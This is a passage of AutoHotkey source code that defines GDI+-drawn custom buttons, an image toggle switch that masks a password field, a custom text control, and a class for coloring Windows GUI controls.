pBitmap:=Gdip_CreateBitmap( This.W , This.H )
G := Gdip_GraphicsFromImage( pBitmap )
Gdip_SetSmoothingMode( G , 2 )
Brush := Gdip_BrushCreateSolid( This.BColor )
Gdip_FillRectangle( G , Brush , -1 , -1 , This.W+2 , This.H+2 )
Gdip_DeleteBrush( Brush )
Brush := Gdip_CreateLineBrushFromRect( 0 , 0 , This.W , This.H , "0xFF2A2C2E" , "0xFF45474E" , 1 , 1 )
Gdip_FillRoundedRectangle( G , Brush , 0 , 1 , This.W , This.H-3 , This.Roundness )
Gdip_DeleteBrush( Brush )
Brush := Gdip_BrushCreateSolid( "0xFF2A2C2E" )
Gdip_FillRoundedRectangle( G , Brush , 0 , 0 , This.W , This.H-8 , This.Roundness )
Gdip_DeleteBrush( Brush )
Brush := Gdip_BrushCreateSolid( "0xFF46474D" )
Gdip_FillRoundedRectangle( G , Brush , 0 , 7 , This.W , This.H-8 , This.Roundness )
Gdip_DeleteBrush( Brush )
Brush := Gdip_CreateLineBrushFromRect( 5 , 3 , This.W ,This.H-7 , "0xFF333639" , "0xFF43474B" , 1 , 1 )
Gdip_FillRoundedRectangle( G , Brush , 1 , 2 , This.W-3 , This.H-6 , This.Roundness )
Gdip_DeleteBrush( Brush )
Pen := Gdip_CreatePen( "0xFF1A1C1F" , 1 )
Gdip_DrawRoundedRectangle( G , Pen , 0 , 0 , This.W , This.H-2 , This.Roundness )
Gdip_DeletePen( Pen )
Brush := Gdip_BrushCreateSolid( This.FColorBottom )
Gdip_TextToGraphics( G , Text , "s" This.Font_Size " Center vCenter c" Brush " x1 y3" , This.Font , This.W , This.H-1 )
Gdip_DeleteBrush( Brush )
Brush := Gdip_BrushCreateSolid( This.FColorTop )
Gdip_TextToGraphics( G , Text , "s" This.Font_Size " Center vCenter c" Brush " x0 y2" , This.Font , This.W , This.H-1 )
Gdip_DeleteBrush( Brush )
Gdip_DeleteGraphics( G )
This.Pressed_Bitmap := Gdip_CreateARGBHBITMAPFromBitmap( pBitmap )
Gdip_DisposeImage( pBitmap )
}
}
class Button2 {
__New(obj,Options,Label,Window,vGlobal) {
This.W := obj.W
This.H := obj.H
This.Font := obj.Font
This.FontOptions := obj.FontOptions
This.Text_Color:= "0x" obj.FontColor
This.Gui_Color := "0x" obj.GuiColor
This.Line_Color:= "0x" obj.LineColor
This.Default_Color:= "0x" obj.DefaultColor
This.Hover_Color  := "0x" obj.HoverColor
This.Roundness := obj.Roundness
This.Func := obj.Func
This.Label := Label
This.Window:= Window
This.Mouse := "Hand"
This.Hover := 1
This.Create_Bitmap(obj[Save.Ling], This.W, This.H)
Gui , % Window ": Add" , Picture , % Options " w" This.W " h" This.H " hwndHwnd 0xE", % Label
This.Hwnd := Hwnd
%vGlobal%["BTHwnd"]["H" Hwnd] := Label
BD := THIS.Pressed.BIND( THIS )
GUICONTROL +G , % Hwnd , % BD
This.Draw_Default()
}
Pressed() {
if (!This.Draw_Pressed())
return
If (This.Func){
FuncRun := This.Func
%FuncRun%(This.Hwnd)
}
}
Draw_Pressed() {
SetImage( This.Hwnd , This.Default_Bitmap )
A_Args.MoveTest := 1
While(GetKeyState("LButton"))
sleep , 10
A_Args.MoveTest := 0
MouseGetPos,,,, ctrl , 2
if( This.Hwnd != ctrl ) {
This.Draw_Default()
return False
} else {
This.Draw_Hover()
return true
}
}
Draw_Default() {
SetImage( This.Hwnd , This.Default_Bitmap )
}
Draw_Hover() {
SetImage( This.Hwnd , This.Hover_Bitmap )
}
NewModel(Type) {
obj := Data["Add"]["Button2"][Type]
DeleteObject( This.Hover_Bitmap )
DeleteObject( This.Default_Bitmap )
This.Text_Color:= "0x" obj.FontColor
This.Gui_Color := "0x" obj.GuiColor
This.Line_Color:= "0x" obj.LineColor
This.Default_Color:= "0x" obj.DefaultColor
This.Hover_Color  := "0x" obj.HoverColor
This.Roundness := obj.Roundness
This.Func := obj.Func
This.Create_Bitmap(obj[Save.Ling], This.W, This.H)
This.Draw_Default()
}
Create_Bitmap(Text, W, H) {
pBitmap:=Gdip_CreateBitmap( W , H )
G := Gdip_GraphicsFromImage( pBitmap )
Gdip_SetSmoothingMode( G , 2 )
Brush := Gdip_BrushCreateSolid( This.Gui_Color )
Gdip_FillRectangle( G , Brush , -1 , -1 , W+2, H+2)
Gdip_DeleteBrush( Brush )
Brush := Gdip_BrushCreateSolid( This.Line_Color )
Gdip_FillRoundedRectangle( G , Brush , 0 , 0 , W-1, H-1, This.Roundness)
Gdip_DeleteBrush( Brush )
Brush := Gdip_BrushCreateSolid( This.Default_Color )
Gdip_FillRoundedRectangle( G , Brush , 2 , 2 , W-5, H-5, This.Roundness-3)
Gdip_DeleteBrush( Brush )
Brush := Gdip_BrushCreateSolid( This.Text_Color )
Gdip_TextToGraphics( G , Text , "s" This.FontOptions " Center vCenter c" Brush " x0 y2 " , This.Font , W , H-1 )
Gdip_DeleteBrush( Brush )
Gdip_DeleteGraphics( G )
This.Default_Bitmap := Gdip_CreateARGBHBITMAPFromBitmap(pBitmap)
Gdip_DisposeImage(pBitmap)
pBitmap:=Gdip_CreateBitmap( W , H )
G := Gdip_GraphicsFromImage( pBitmap )
Gdip_SetSmoothingMode( G , 2 )
Brush := Gdip_BrushCreateSolid( This.Gui_Color )
Gdip_FillRectangle( G , Brush , -1 , -1 , W+2, H+2)
Gdip_DeleteBrush( Brush )
Brush := Gdip_BrushCreateSolid( This.Line_Color )
Gdip_FillRoundedRectangle( G , Brush , 0 , 0 , W-1, H-1, This.Roundness)
Gdip_DeleteBrush( Brush )
Brush := Gdip_BrushCreateSolid( This.Hover_Color )
Gdip_FillRoundedRectangle( G , Brush , 2 , 2 , W-5, H-5, This.Roundness-3)
Gdip_DeleteBrush( Brush )
Brush := Gdip_BrushCreateSolid( This.Text_Color )
Gdip_TextToGraphics( G , Text , "s" This.FontOptions " Center vCenter c" Brush " x0 y2" , This.Font , W , H-1 )
Gdip_DeleteBrush( Brush )
Gdip_DeleteGraphics( G )
This.Hover_Bitmap := Gdip_CreateARGBHBITMAPFromBitmap(pBitmap)
Gdip_DisposeImage(pBitmap)
}
}
class IMGButton {
__New(obj,Options,Label,Window,vGlobal) {
This.W := obj.W
This.H := obj.H
This.D_Bitmap := A_Args.PNG[obj.PNG1]
This.H_Bitmap := A_Args.PNG[obj.PNG2]
This.Func     := obj.Func
This.Label    := Label
This.Window := Window
This.Mouse := "Hand"
This.Hover := 1
Gui, % Window ": Add" , Picture , % Options " w" This.W " h" This.H " 0xE hwndHwnd", % Label
This.Hwnd := Hwnd
%vGlobal%["BTHwnd"]["H" Hwnd] := Label
BD := THIS.Pressed.BIND( THIS )
GUICONTROL +G , % Hwnd , % BD
This.Draw_Default()
}
Pressed() {
if (!This.Draw_Pressed())
return
If (This.Func){
FucRun := This.Func
%FucRun%(This.Hwnd,A_GuiControl)
}
}
Draw_Default() {
SetImage( This.Hwnd , This.D_Bitmap )
}
Draw_Hover() {
SetImage( This.Hwnd , This.H_Bitmap )
}
Draw_Pressed() {
SetImage( This.Hwnd , This.D_Bitmap )
A_Args.MoveTest := 1
While( GetKeyState( "LButton" ) )
sleep , 10
A_Args.MoveTest := 0
MouseGetPos,,,, ctrl , 2
if( This.Hwnd != ctrl ) {
return False
} else {
SetImage( This.Hwnd , This.H_Bitmap )
return True
}
}
}
class IMGSwitch {
__New(obj,Options,Label,Window,vGlobal) {
This.W:=obj.W
This.H:=obj.H
This.GuiColor:= "0x" obj.GuiColor
This.Label:= Label
This.Window := Window
This.Mouse:= "Hand"
This.Hover:= 1
This.Section := obj.Load="Profile" ? Save.Profile : obj.Load
This.State:= Save[This.Section][Label]
This.Create_Off_BitmapNoText()
This.Create_On_BitmapNoText()
Gui, % Window ": Add" , Picture , % Options " w" This.W " h" This.H " 0xE hwndHwnd", % This.Label
This.Hwnd := Hwnd
%vGlobal%["BTHwnd"]["H" Hwnd] := Label
BD := This.Switch_State.BIND( This )
GUICONTROL +G , % Hwnd , % BD
This.Draw_Default()
}
Create_Off_BitmapNoText() {
pBitmap:=Gdip_CreateBitmap( This.W+2, This.H+2 )
G := Gdip_GraphicsFromImage( pBitmap )
Gdip_SetSmoothingMode( G , 4 )
Brush := Gdip_BrushCreateSolid( This.GuiColor )
Gdip_FillRectangle( G , Brush , -1 , -1 , This.W+4, This.H+4)
Gdip_DeleteBrush( Brush )
Gdip_DrawImageRect(G, A_Args.PNG.HideOFF, 0, 1, This.W, This.H)
This.Off_Bitmap := Gdip_CreateARGBHBITMAPFromBitmap(pBitmap)
Gdip_DrawImageRect(G, A_Args.PNG.HideHOFF, 0, 1, This.W, This.H)
This.Hover_Bitmap_Off := Gdip_CreateARGBHBITMAPFromBitmap(pBitmap)
Gdip_DeleteGraphics( G )
Gdip_DisposeImage(pBitmap)
}
Create_On_BitmapNoText() {
pBitmap:=Gdip_CreateBitmap( This.W+2, This.H+2)
G := Gdip_GraphicsFromImage( pBitmap )
Gdip_SetSmoothingMode( G , 4 )
Brush := Gdip_BrushCreateSolid( This.GuiColor )
Gdip_FillRectangle( G , Brush , -1 , -1 , This.W+4, This.H+4)
Gdip_DeleteBrush( Brush )
Gdip_DrawImageRect(G, A_Args.PNG.HideON, 0, 1, This.W, This.H)
This.On_Bitmap := Gdip_CreateARGBHBITMAPFromBitmap(pBitmap)
Gdip_DrawImageRect(G, A_Args.PNG.HideHON, 0, 1, This.W, This.H)
This.Hover_Bitmap_On := Gdip_CreateARGBHBITMAPFromBitmap(pBitmap)
Gdip_DeleteGraphics( G )
Gdip_DisposeImage(pBitmap)
}
Switch_State() {
A_Args.MoveTest := 1
While( GetKeyState( "LButton" ) )
sleep , 10
A_Args.MoveTest := 0
MouseGetPos,,,, ctrl , 2
if(ctrl != This.Hwnd)
return
This.State := !This.State
if (This.State)
GuiControl, % "+Password", % MHGui.Controls.Edit01.Hwnd
else
GuiControl, % "-Password", % MHGui.Controls.Edit01.Hwnd
Save.Write(This.Section, This.Label, This.State)
Save.Save(Save)
This.Draw_Hover()
}
Draw_Default() {
if(This.State)
SetImage( This.Hwnd , This.On_Bitmap )
else
SetImage( This.Hwnd , This.Off_Bitmap )
}
Draw_Hover() {
if(This.State)
SetImage( This.Hwnd , This.Hover_Bitmap_On)
else
SetImage( This.Hwnd , This.Hover_Bitmap_Off )
}
}
class CustomText {
__New(obj,Options,Label,Window,vGlobal) {
This.W := obj.W
This.H := obj.H
This.FontOptions := obj.FontOptions
This.Font := obj.Font
This.pBitmap:=Gdip_CreateBitmap( This.W, This.H )
This.G := Gdip_GraphicsFromImage( This.pBitmap )
Gdip_SetSmoothingMode( This.G, 2 )
This.BrushBKColor := Gdip_BrushCreateSolid( "0x" obj.GuiColor )
This.BrushText    := Gdip_BrushCreateSolid( "0x" obj.FontColor )
Gdip_FillRectangle( This.G, This.BrushBKColor, -1, -1, This.W+1, This.H+1)
Gdip_TextToGraphics( This.G, obj[Save.Ling], This.FontOptions " c" This.BrushText, This.Font, This.W-1, This.H)
This.PNG := Gdip_CreateARGBHBITMAPFromBitmap(This.pBitmap)
Gui, % Window ": Add", Picture, % Options " hwndHwnd", % "HBITMAP:*" This.PNG
This.Hwnd := Hwnd
This.Window := Window
%vGlobal%["BTHwnd"]["H" Hwnd] := Label
}
Set(obj) {
ForDelete := This.PNG
Gdip_FillRectangle( This.G, This.BrushBKColor, -1, -1, This.W+1, This.H+1)
Gdip_TextToGraphics( This.G, obj[Save.Ling], This.FontOptions " c" This.BrushText, This.Font, This.W-1, This.H)
This.PNG := Gdip_CreateARGBHBITMAPFromBitmap(This.pBitmap)
SetImage( This.Hwnd , This.PNG )
DeleteObject( ForDelete )
}
Editor(PNG) {
pBitmap:=Gdip_CreateBitmap( W, H )
G := Gdip_GraphicsFromImage( pBitmap )
Gdip_SetSmoothingMode( G, 2 )
BrushBKColor := Gdip_BrushCreateSolid( "0x" This.GuiColor )
BrushText    := Gdip_BrushCreateSolid( "0x" This.FontColor )
Gdip_FillRectangle( G, BrushBKColor, -1, -1, W+1, H+1)
Gdip_TextToGraphics( G, obj[Save.Ling], This.FontOptions " c" BrushText, This.Font, W-1, H)
This.PNG := Gdip_CreateARGBHBITMAPFromBitmap(pBitmap)
Gdip_DeleteBrush( BrushBKColor )
Gdip_DeleteBrush( BrushText )
Gdip_DeleteGraphics( G )
Gdip_DisposeImage(pBitmap)
SetImage( This.Hwnd , This.PNG )
}
}
}
Class classGuiColors {
Static Attached := {}
Static HandledMessages := {Edit: 0, ListBox: 0, Static: 0}
Static MessageHandler := "classGuiColors_OnMessage"
Static WM_CTLCOLOR := {Edit: 0x0133, ListBox: 0x134, Static: 0x0138}
Static HTML := {AQUA: 0xFFFF00, BLACK: 0x000000, BLUE: 0xFF0000, FUCHSIA: 0xFF00FF, GRAY: 0x808080, GREEN: 0x008000, LIME: 0x00FF00, MAROON: 0x000080, NAVY: 0x800000, OLIVE: 0x008080, PURPLE: 0x800080, RED: 0x0000FF, SILVER: 0xC0C0C0, TEAL: 0x808000, WHITE: 0xFFFFFF, YELLOW: 0x00FFFF}
Static NullBrush := DllCall("GetStockObject", "Int", 5, "UPtr")
Static SYSCOLORS := {Edit: "", ListBox: "", Static: ""}
Static ErrorMsg := ""
Static InitClass := classGuiColors.ClassInit()
__New() {
If (This.InitClass == "!DONE!") {
This["!Access_Denied!"] := True
Return False
}
}
__Delete() {
If This["!Access_Denied!"]
Return
This.Free()
}
ClassInit() {
classGuiColors := New classGuiColors
Return "!DONE!"
}
CheckBkColor(ByRef BkColor, Class) {
This.ErrorMsg := ""
If (BkColor != "") && !This.HTML.HasKey(BkColor) && !RegExMatch(BkColor, "^[[:xdigit:]]{6}$") {
This.ErrorMsg := "Invalid parameter BkColor: " . BkColor
Return False
}
BkColor := BkColor = "" ? This.SYSCOLORS[Class]
: This.HTML.HasKey(BkColor) ? This.HTML[BkColor]
: "0x" . SubStr(BkColor, 5, 2) . SubStr(BkColor, 3, 2) . SubStr(BkColor, 1, 2)
Return True
}
CheckTxColor(ByRef TxColor) {
This.ErrorMsg := ""
If (TxColor != "") && !This.HTML.HasKey(TxColor) && !RegExMatch(TxColor, "i)^[[:xdigit:]]{6}$") {
This.ErrorMsg := "Invalid parameter TextColor: " . TxColor
Return False
}
TxColor := TxColor = "" ? ""
: This.HTML.HasKey(TxColor) ? This.HTML[TxColor]
: "0x" . SubStr(TxColor, 5, 2) . SubStr(TxColor, 3, 2) . SubStr(TxColor, 1, 2)
Return True
}
Attach(HWND, BkColor, TxColor := "") {
Static ClassNames := {Button: "", ComboBox: "", Edit: "", ListBox: "", Static: ""}
Static BS_CHECKBOX := 0x2, BS_RADIOBUTTON := 0x8
Static ES_READONLY := 0x800
Static COLOR_3DFACE := 15, COLOR_WINDOW := 5
If (This.SYSCOLORS.Edit = "") {
This.SYSCOLORS.Static := DllCall("User32.dll\GetSysColor", "Int", COLOR_3DFACE, "UInt")
This.SYSCOLORS.Edit := DllCall("User32.dll\GetSysColor", "Int", COLOR_WINDOW, "UInt")
This.SYSCOLORS.ListBox := This.SYSCOLORS.Edit
}
This.ErrorMsg := ""
If (BkColor = "") && (TxColor = "") {
This.ErrorMsg := "Both parameters BkColor and TxColor are empty!"
Return False
}
If !(CtrlHwnd := HWND + 0) || !DllCall("User32.dll\IsWindow", "UPtr", HWND, "UInt") {
This.ErrorMsg := "Invalid parameter HWND: " . HWND
Return False
}
If This.Attached.HasKey(HWND) {
This.ErrorMsg := "Control " . HWND . " is already registered!"
Return False
}
Hwnds := [CtrlHwnd]
Classes := ""
WinGetClass, CtrlClass, ahk_id %CtrlHwnd%
This.ErrorMsg := "Unsupported control class: " . CtrlClass
If !ClassNames.HasKey(CtrlClass)
Return False
ControlGet, CtrlStyle, Style, , , ahk_id %CtrlHwnd%
If (CtrlClass = "Edit")
Classes := ["Edit", "Static"]
Else If (CtrlClass = "Button") {
IF (CtrlStyle & BS_RADIOBUTTON) || (CtrlStyle & BS_CHECKBOX)
Classes := ["Static"]
Else
Return False
}
Else If (CtrlClass = "ComboBox") {
VarSetCapacity(CBBI, 40 + (A_PtrSize * 3), 0)
NumPut(40 + (A_PtrSize * 3), CBBI, 0, "UInt")
DllCall("User32.dll\GetComboBoxInfo", "Ptr", CtrlHwnd, "Ptr", &CBBI)
Hwnds.Insert(NumGet(CBBI, 40 + (A_PtrSize * 2, "UPtr")) + 0)
Hwnds.Insert(Numget(CBBI, 40 + A_PtrSize, "UPtr") + 0)
Classes := ["Edit", "Static", "ListBox"]
}
If !IsObject(Classes)
Classes := [CtrlClass]
If (BkColor <> "Trans")
If !This.CheckBkColor(BkColor, Classes[1])
Return False
If !This.CheckTxColor(TxColor)
Return False
For I, V In Classes {
If (This.HandledMessages[V] = 0)
OnMessage(This.WM_CTLCOLOR[V], This.MessageHandler)
This.HandledMessages[V] += 1
}
If (BkColor = "Trans")
Brush := This.NullBrush
Else
Brush := DllCall("Gdi32.dll\CreateSolidBrush", "UInt", BkColor, "UPtr")
For I, V In Hwnds
This.Attached[V] := {Brush: Brush, TxColor: TxColor, BkColor: BkColor, Classes: Classes, Hwnds: Hwnds}
DllCall("User32.dll\InvalidateRect", "Ptr", HWND, "Ptr", 0, "Int", 1)
This.ErrorMsg := ""
Return True
}
Change(HWND, BkColor, TxColor := "") {
This.ErrorMsg := ""
HWND += 0
If !This.Attached.HasKey(HWND)
Return This.Attach(HWND, BkColor, TxColor)
CTL := This.Attached[HWND]
If (BkColor <> "Trans")
If !This.CheckBkColor(BkColor, CTL.Classes[1])
Return False
If !This.CheckTxColor(TxColor)
Return False
If (BkColor <> CTL.BkColor) {
If (CTL.Brush) {
If (Ctl.Brush <> This.NullBrush)
DllCall("Gdi32.dll\DeleteObject", "Prt", CTL.Brush)
This.Attached[HWND].Brush := 0
}
If (BkColor = "Trans")
Brush := This.NullBrush
Else
Brush := DllCall("Gdi32.dll\CreateSolidBrush", "UInt", BkColor, "UPtr")
For I, V In CTL.Hwnds {
This.Attached[V].Brush := Brush
This.Attached[V].BkColor := BkColor
}
}
For I, V In Ctl.Hwnds
This.Attached[V].TxColor := TxColor
This.ErrorMsg := ""
DllCall("User32.dll\InvalidateRect", "Ptr", HWND, "Ptr", 0, "Int", 1)
Return True
}
Detach(HWND) {
This.ErrorMsg := ""
HWND += 0
If This.Attached.HasKey(HWND) {
CTL := This.Attached[HWND].Clone()
If (CTL.Brush) && (CTL.Brush <> This.NullBrush)
DllCall("Gdi32.dll\DeleteObject", "Prt", CTL.Brush)
For I, V In CTL.Classes {
If This.HandledMessages[V] > 0 {
This.HandledMessages[V] -= 1
If This.HandledMessages[V] = 0
OnMessage(This.WM_CTLCOLOR[V], "")
} }
For I, V In CTL.Hwnds
This.Attached.Remove(V, "")
DllCall("User32.dll\InvalidateRect", "Ptr", HWND, "Ptr", 0, "Int", 1)
CTL := ""
Return True
}
This.ErrorMsg := "Control " . HWND . " is not registered!"
Return False
}
Free() {
For K, V In This.Attached
If (V.Brush) && (V.Brush <> This.NullBrush)
DllCall("Gdi32.dll\DeleteObject", "Ptr", V.Brush)
For K, V In This.HandledMessages
If (V > 0) {
OnMessage(This.WM_CTLCOLOR[K], "")
This.HandledMessages[K] := 0
}
This.Attached := {}
Return True
}
IsAttached(HWND) {
Return This.Attached.HasKey(HWND)
}
}
classGuiColors_OnMessage(HDC, HWND) {
Critical
If classGuiColors.IsAttached(HWND) {
CTL := classGuiColors.Attached[HWND]
If (CTL.TxColor != "")
DllCall("Gdi32.dll\SetTextColor", "Ptr", HDC, "UInt", CTL.TxColor)
If (CTL.BkColor = "Trans")
DllCall("Gdi32.dll\SetBkMode", "Ptr", HDC, "UInt", 1)
Else
DllCall("Gdi32.dll\SetBkColor", "Ptr", HDC, "UInt", CTL.BkColor)
Return CTL.Brush
}
}
CreateGui()
Return
